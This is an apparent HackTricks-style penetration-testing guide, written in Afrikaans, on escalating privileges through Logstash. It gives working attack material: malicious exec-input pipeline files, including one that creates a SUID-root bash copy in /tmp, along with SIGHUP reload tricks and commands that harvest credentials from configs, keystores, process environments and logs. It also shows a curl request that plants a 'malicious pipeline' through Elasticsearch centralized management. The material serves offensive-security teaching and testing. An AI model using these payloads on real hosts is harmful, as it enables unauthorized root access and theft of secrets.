# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en uit te stuur** deur 'n stelsel bekend as **pipelines**. Hierdie pipelines bestaan uit **input**, **filter**, en **output** fases. 'n Interessante aspek ontstaan wanneer Logstash op 'n gekompromitteerde masjien loop.

### Konfigurasie van pipelines

Pipelines word gekonfigureer in die lêer **/etc/logstash/pipelines.yml**, wat die plekke van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer wys waar die **.conf**-lêers, wat pipeline-konfigurasies bevat, geleë is. Wanneer 'n **Elasticsearch output module** gebruik word, is dit algemeen dat **pipelines** **Elasticsearch credentials** bevat, wat dikwels uitgebreide bevoegdhede het weens Logstash se behoefte om data na Elasticsearch te skryf. Wildcards in konfigurasie-paaie laat Logstash toe om alle ooreenstemmende pipelines in die aangewese gids uit te voer.

As Logstash met `-f <directory>` begin word in plaas van `pipelines.yml`, **alle lêers binne daardie gids word in leksikografiese volgorde gekonkateneer en as 'n enkele konfigurasie geparseer**. Dit skep 2 offensiewe implikasies:

- 'n Geplaatste lêer soos `000-input.conf` of `zzz-output.conf` kan verander hoe die finale pipeline saamgestel word
- 'n Verkeerd gevormde lêer kan verhoed dat die hele pipeline gelaai word, dus valideer payloads noukeurig voordat jy op auto-reload staatmaak

### Vinnige enumerasie op 'n gekompromitteerde gasheer

Op 'n masjien waarop Logstash geïnstalleer is, ondersoek vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die plaaslike monitoring-API bereikbaar is. Standaard bind dit aan **127.0.0.1:9600**, wat gewoonlik genoeg is nadat jy op die gasheer geland het:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dit gee gewoonlik vir jou pipeline IDs, runtime-besonderhede, en bevestiging dat jou gewysigde pipeline gelaai is.

Credentials wat uit Logstash herwin word ontsluit gereeld **Elasticsearch**, so kyk na [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Om privilege escalation te probeer, identifiseer eers die gebruiker waaronder die Logstash service loop, tipies die **logstash** gebruiker. Verseker jy voldoen aan **een** van hierdie kriteria:

- Besit **write access** tot 'n pipeline **.conf** file **of**
- Die **/etc/logstash/pipelines.yml** file gebruik 'n wildcard, en jy kan na die teiken-gids skryf

Daarbenewens moet **een** van hierdie voorwaardes vervul wees:

- Vermoë om die Logstash service te herbegin **of**
- Die **/etc/logstash/logstash.yml** file is op **config.reload.automatic: true** gestel

As daar 'n wildcard in die konfigurasie is, laat die skep van 'n lêer wat by daardie wildcard pas toe vir command execution. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier, **interval** bepaal die uitvoerfrekwensie in sekondes. In die gegewe voorbeeld word die **whoami** opdrag elke 120 sekondes uitgevoer, met sy uitvoer gerig na **/tmp/output.log**.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, sal Logstash outomaties nuwe of gewysigde pipeline-konfigurasies opspoor en toepas sonder om herstart te benodig. As daar geen wildcard is nie, kan wysigings steeds aan bestaande konfigurasies gemaak word, maar wees versigtig om ontwrigting te voorkom.

### Meer Betroubare Pipeline Payloads

Die `exec` input plugin werk steeds in huidige releases en vereis of 'n `interval` of 'n `schedule`. Uitvoering gebeur deur die Logstash JVM te **forking**, dus as geheue skaars is, kan jou payload misluk met `ENOMEM` in plaas van stilweg uit te voer.

'n Meer praktiese privilege-escalation payload is gewoonlik een wat 'n volhoubare artefak agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie regte het om die proses te herbegin nie, maar die proses kan sein, ondersteun Logstash ook 'n herlaai wat deur **SIGHUP** op Unix-agtige stelsels geaktiveer word:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees bewus dat nie elke plugin reload-vriendelik is nie. Byvoorbeeld, die **stdin** input verhinder outomatiese herlaai, so moenie aanvaar dat `config.reload.automatic` altyd jou veranderinge sal oppik nie.

### Stealing Secrets from Logstash

Voordat jy slegs op code execution fokus, oes die data waartoe Logstash reeds toegang het:

- Plaintekst-inlogbewyse word dikwels hardcoded binne `elasticsearch {}` outputs, `http_poller`, JDBC inputs, of cloud-verwante instellings
- Beveiligde instellings kan in **`/etc/logstash/logstash.keystore`** of in 'n ander `path.settings`-gids wees
- Die keystore-wagwoord word gereeld voorsien via **`LOGSTASH_KEYSTORE_PASS`**, en pakketgebaseerde installasies haal dit gewoonlik uit **`/etc/sysconfig/logstash`**
- Omgewingsveranderlike-uitbreiding met `${VAR}` word by Logstash-opstart opgelos, so dit is die moeite werd om die diens-omgewing na te gaan

Nuttige kontroles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om te kontroleer omdat **CVE-2023-46672** getoon het dat Logstash onder sekere omstandighede sensitiewe inligting in logs kon opteken. Op 'n post-exploitation host kan ou Logstash logs en `journald` entries dus credentials openbaar maak, selfs al verwys die huidige config na die keystore in plaas van om secrets inline te stoor.

### Misbruik van Gesentraliseerde Pipeline-bestuur

In sommige omgewings steun die host glad nie op plaaslike `.conf`-lêers nie. As **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash gesentraliseerde pipelines van Elasticsearch/Kibana trek, en nadat hierdie modus aangeskakel is, is plaaslike pipeline configs nie meer die bron van waarheid nie.

Dit beteken 'n ander aanvalspad:

1. Herwin Elastic credentials vanaf plaaslike Logstash settings, die keystore of logs
2. Kontroleer of die rekening die **`manage_logstash_pipelines`** cluster-privilege het
3. Skep of vervang 'n gesentraliseerde pipeline sodat die Logstash host jou payload by sy volgende poll-interval uitvoer

Die Elasticsearch API wat vir hierdie funksie gebruik word, is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dit is veral nuttig wanneer plaaslike lêers slegs leesbaar is, maar Logstash reeds geregistreer is om pipelines op afstand te haal.

## Verwysings

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
